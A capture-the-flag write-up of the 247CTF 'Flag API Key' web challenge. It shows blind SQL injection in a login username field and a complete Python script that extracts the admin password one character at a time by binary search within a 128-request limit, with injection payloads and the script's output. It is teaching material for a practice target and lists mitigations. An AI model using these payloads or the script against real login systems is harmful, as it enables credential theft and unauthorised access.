# Writeup: Flag API Key - 247CTF Web Challenge

## Challenge Info

- **Name**: Flag API Key
- **Category**: Web
- **Platform**: 247CTF
- **URL**: `https://3eb960aa2742e589.247ctf.com/`

## Challenge Description

> We created an API service which has a few endpoints. Can you use the API to figure out the admin user's password? The admin user's password uses the same character set and length as the flag (32-HEX).

---

## Initial Analysis

### Reconnaissance

Upon accessing the main URL, the server displays API documentation:

```bash
$ curl https://3eb960aa2742e589.247ctf.com/
```

### Discovered Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/get_token` | GET | Generates valid API token for 128 requests (resets admin password) |
| `/api/login` | POST | Login with username, password, api token |
| `/api/get_flag` | POST | Retrieves flag with correct password (incorrect password resets password) |

### Login Parameters

```
POST /api/login
Data: username, password, api
Example: username=admin&password=4764fe68c18380e2dbc0bccbdc862691&api=06c6e1d3fae974defb8ee5f59c471bf2
```

### Critical Restrictions

1. **128 requests maximum** per token
2. Password is **32 hexadecimal characters** (0-9, a-f)
3. Getting a new token **resets the password**
4. Incorrect password in `/api/get_flag` **resets the password**

---

## Vulnerability Discovery

### SQL Injection Test

```bash
$ curl -s -X POST "https://3eb960aa2742e589.247ctf.com/api/login" \
  -d "username=admin'--&password=x&api=TOKEN"
```

**Response:**
```json
{"message":"Welcome back admin'--!","result":"success"}
```

**Vulnerability confirmed**: SQL Injection in the `username` field.

The query is likely:
```sql
SELECT * FROM users WHERE username='INPUT' AND password='...'
```

With `admin'--` we comment out the password verification.

### Boolean-Based Blind SQLi Verification

```bash
# Does password start with 'a'?
$ curl -X POST ... -d "username=admin' AND password LIKE 'a%'--&..."
{"message":"Invalid username and password!","result":"invalid"}

# Does password start with '3'?
$ curl -X POST ... -d "username=admin' AND password LIKE '3%'--&..."
{"message":"Welcome back admin!","result":"success"}
```

We can extract the password character by character.

---

## The Problem: 128 Request Limit

### Mathematical Analysis

- **Password**: 32 hexadecimal characters
- **Possible values per character**: 16 (0-9, a-f)
- **Linear search**: 16 x 32 = 512 requests (worst case) [NO]
- **Linear search average**: 8 x 32 = 256 requests [NO]

With only 128 requests, linear search is not viable.

### Solution: Binary Search

- **Queries per character**: log2(16) = 4 (maximum)
- **Total queries**: 4 x 32 = **128 requests exactly** [OK]

---

## Attack Implementation

### Binary Search Strategy

To find each password character, we use SQL comparisons:

```sql
SUBSTR(password, position, 1) >= 'character'
```

Example to find the first character:

```
Search space: 0123456789abcdef

Query 1: SUBSTR(password,1,1) >= '8' → TRUE  → search in [8-f]
Query 2: SUBSTR(password,1,1) >= 'c' → FALSE → search in [8-b]
Query 3: SUBSTR(password,1,1) >= 'a' → TRUE  → search in [a-b]
Query 4: SUBSTR(password,1,1) >= 'b' → TRUE  → character = 'b'
```

### Exploitation Script

```python
#!/usr/bin/env python3
"""
247CTF - Flag API Key Solver
Blind SQL Injection with binary search
"""

import requests

URL = "https://3eb960aa2742e589.247ctf.com/api/login"
HEX_CHARS = "0123456789abcdef"

def get_token():
    r = requests.get("https://3eb960aa2742e589.247ctf.com/api/get_token")
    token = r.json()["message"].split(" ")[-1].rstrip("!")
    print(f"[*] New token: {token}")
    return token

def check_gte(api, prefix, char):
    """Verifies if password[len(prefix)] >= char using SUBSTR"""
    pos = len(prefix) + 1  # SQL uses 1-indexing
    payload = f"admin' AND SUBSTR(password,{pos},1) >= '{char}'--"
    r = requests.post(URL, data={"username": payload, "password": "x", "api": api})
    return r.json()["result"] == "success"

def binary_search_char(api, prefix, requests_count):
    """Finds the character at position len(prefix) using binary search"""
    chars = list(HEX_CHARS)
    low, high = 0, len(chars) - 1

    while low < high:
        mid = (low + high + 1) // 2
        requests_count[0] += 1
        if check_gte(api, prefix, chars[mid]):
            low = mid
        else:
            high = mid - 1

    return chars[low]

def extract_password():
    api = get_token()
    password = ""
    requests_count = [0]

    for pos in range(32):
        c = binary_search_char(api, password, requests_count)
        password += c
        print(f"[+] Pos {pos:2d}: {c} -> {password} (requests: {requests_count[0]})")

    return password, requests_count[0]

# Extract password
password, count = extract_password()
print(f"\n[+] Complete password: {password}")
print(f"[+] Total requests: {count}")

# Get flag
print("\n[*] Getting flag...")
r = requests.post("https://3eb960aa2742e589.247ctf.com/api/get_flag",
                  data={"password": password})
print(r.json())
```

### Execution

```
[*] New token: 1ccd9520e40f5566b41d2e72b89e468d
[+] Pos  0: b -> b (requests: 4)
[+] Pos  1: c -> bc (requests: 8)
[+] Pos  2: 8 -> bc8 (requests: 12)
...
[+] Pos 30: 2 -> bc8c87aa24bb33b2e02b59c9fa15be2 (requests: 124)
[+] Pos 31: 1 -> bc8c87aa24bb33b2e02b59c9fa15be21 (requests: 128)

[+] Complete password: bc8c87aa24bb33b2e02b59c9fa15be21
[+] Total requests: 128

[*] Getting flag...
{'message': '247CTF{61f66e2bXXXXXXXXXXXXXXXX77665cb8}', 'result': 'success'}
```

---

## Flag

```
247CTF{61f66e2bXXXXXXXXXXXXXXXX77665cb8}
```

---

## Attack Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK FLOW                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. API Reconnaissance                                          │
│     └─→ Discover endpoints and 128 request restriction         │
│                                                                 │
│  2. Identify SQL Injection                                      │
│     └─→ username=admin'-- bypasses authentication              │
│                                                                 │
│  3. Confirm Blind SQLi                                          │
│     └─→ admin' AND password LIKE 'X%'-- works                  │
│                                                                 │
│  4. Calculate optimal strategy                                  │
│     └─→ 128 requests / 32 chars = 4 queries/char               │
│     └─→ log₂(16) = 4 → Binary search is perfect                │
│                                                                 │
│  5. Implement binary search with SUBSTR                         │
│     └─→ SUBSTR(password,N,1) >= 'X' to split search space      │
│                                                                 │
│  6. Extract complete password in exactly 128 requests           │
│     └─→ bc8c87aa24bb33b2e02b59c9fa15be21                        │
│                                                                 │
│  7. Get flag with password                                      │
│     └─→ POST /api/get_flag → FLAG!                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Binary Search Visualization

```
Finding character at position 1 of password:

     Space: 0 1 2 3 4 5 6 7 8 9 a b c d e f
                              ↑
     Query 1: >= '8' ? TRUE   └── search right

     Space:                 8 9 a b c d e f
                                    ↑
     Query 2: >= 'c' ? FALSE        └── search left

     Space:                 8 9 a b
                                  ↑
     Query 3: >= 'a' ? TRUE       └── search right

     Space:                     a b
                                    ↑
     Query 4: >= 'b' ? TRUE         └── found: 'b'

     Total: 4 queries for 1 character
     For 32 characters: 4 × 32 = 128 queries [OK]
```

---

## Files

```
/root/ctf/api_sqli/
├── flag_api_key.md    # This writeup
└── solve.py           # Solution script
```

---

## Key Takeaways

### Exploited Vulnerabilities

1. **SQL Injection in username**: No input sanitization
2. **Exposed information**: API documents all endpoints and restrictions
3. **Insufficient restriction**: 128 requests is exactly enough for binary search

### Why Binary Search Works

| Method | Queries/char | Total (32 chars) | Viable |
|--------|--------------|------------------|--------|
| Linear (worst) | 16 | 512 | NO |
| Linear (average) | 8 | 256 | NO |
| **Binary** | **4** | **128** | YES |

### Recommended Mitigations

1. **Prepared Statements**: Use parameterized queries
2. **Input Validation**: Validate username format
3. **Stricter Rate Limiting**: Less than 128 requests would make the attack impossible
4. **Anomaly Detection**: Alert on SQLi patterns in inputs

---

## Key Concepts

### Blind SQL Injection

When we don't see the direct query result but can infer information based on:
- **Boolean-based**: Different response for TRUE/FALSE
- **Time-based**: Response delay for TRUE/FALSE

### Algorithmic Complexity

- **Linear search**: O(n) where n = possible values
- **Binary search**: O(log n)

For 16 hexadecimal values:
- Linear: up to 16 queries
- Binary: maximum 4 queries (log₂16 = 4)

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [Binary Search Algorithm](https://en.wikipedia.org/wiki/Binary_search_algorithm)
